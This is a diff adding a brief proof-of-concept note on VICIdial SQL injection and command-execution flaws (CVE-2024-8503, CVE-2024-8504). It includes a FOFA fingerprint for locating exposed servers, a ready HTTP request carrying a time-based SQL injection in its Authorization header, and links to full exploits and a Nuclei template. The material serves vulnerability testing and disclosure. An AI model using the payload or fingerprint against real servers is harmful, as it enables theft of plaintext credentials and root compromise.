@@ -1,0 +1,33 @@
+## VICIdial Unauthenticated SQLi to RCE (CVE-2024-8503 and CVE-2024-8504)
+
+This vulnerability can lead to username and plaintext password exposure. When combined with CVE-2024-8504, it causes a remote code execution vulnerability via sql injection.
+
+The following PoC code tests the vulnerability on a time based.
+
+
+CVE-2024-8503 (Sqli)
+```
+An unauthenticated attacker can leverage a time-based SQL injection vulnerability in VICIdial to enumerate database records. By default, VICIdial stores plaintext credentials within the database.
+```
+
+CVE-2024-8504 (RCE)
+```
+An attacker with authenticated access to VICIdial as an "agent" can execute arbitrary shell commands as the "root" user. This attack can be chained with CVE-2024-8503 to execute arbitrary shell commands starting from an unauthenticated perspective.
+```
+
+## fofa
+```
+icon_hash="1375401192"
+```
+## Poc Example
+```
+        GET /VERM/VERM_AJAX_functions.php?function=log_custom_report HTTP/1.1
+        Host: 
+        Authorization: Basic JywnJyxzbGVlcCg2KSk7IzpiYXI=
+```
+
+## Exploits
+https://en.0day.today/exploit/39746
+https://github.com/Chocapikk/CVE-2024-8504
+## Nuclei Template
+https://github.com/projectdiscovery/nuclei-templates/pull/10757
